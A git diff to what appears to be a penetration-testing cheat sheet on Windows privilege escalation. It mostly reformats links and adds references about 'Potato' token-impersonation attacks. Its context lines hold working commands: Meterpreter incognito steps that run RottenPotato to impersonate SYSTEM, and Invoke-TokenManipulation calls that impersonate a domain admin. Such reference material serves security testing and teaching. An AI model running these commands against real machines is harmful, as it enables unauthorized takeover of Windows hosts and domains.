@@ -1116,18 +1116,17 @@ python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc
 
 ### RottenPotato (Token Impersonation)
 
-* Binary available at : https://github.com/foxglovesec/RottenPotato
-* Binary available at : https://github.com/breenmachine/RottenPotatoNG
-
-```c
-getuid
-getprivs
-use incognito
-list\_tokens -u
-cd c:\temp\
-execute -Hc -f ./rot.exe
-impersonate\_token "NT AUTHORITY\SYSTEM"
-```
+* Binary available at : [foxglovesec/RottenPotato](https://github.com/foxglovesec/RottenPotato) and [breenmachine/RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)
+* Exploit using Metasploit with `incognito mode` loaded.
+    ```c
+    getuid
+    getprivs
+    use incognito
+    list\_tokens -u
+    cd c:\temp\
+    execute -Hc -f ./rot.exe
+    impersonate\_token "NT AUTHORITY\SYSTEM"
+    ```
 
 ```powershell
 Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
@@ -1141,7 +1140,7 @@ Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -n
 > If the machine is **>= Windows 10 1809 & Windows Server 2019** - Try **Rogue Potato**    
 > If the machine is **< Windows 10 1809 < Windows Server 2019** - Try **Juicy Potato**
 
-* Binary available at : https://github.com/ohpe/juicy-potato/releases    
+* Binary available at : [ohpe/juicy-potato](https://github.com/ohpe/juicy-potato/releases) 
 
 1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)
 
@@ -1174,7 +1173,7 @@ Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -n
 
 ### Rogue Potato (Fake OXID Resolver)
 
-* Binary available at https://github.com/antonioCoco/RoguePotato
+* Binary available at [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
 
 ```powershell
 # Network redirector / port forwarder to run on your remote machine, must use port 135 as src port
@@ -1440,3 +1439,5 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 * [ABUSING ARBITRARY FILE DELETES TO ESCALATE PRIVILEGE AND OTHER GREAT TRICKS - March 17, 2022 | Simon Zuckerbraun](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
 * [Bypassing AppLocker by abusing HashInfo - 2022-08-19 - Ian](https://shells.systems/post-bypassing-applocker-by-abusing-hashinfo/)
 * [Giving JuicyPotato a second chance: JuicyPotatoNG - @decoder_it, @splinter_code](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
+* [IN THE POTATO FAMILY, I WANT THEM ALL - @BlWasp_ ](https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all)
+* [Potatoes - Windows Privilege Escalation - Jorge Lajara - November 22, 2020](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
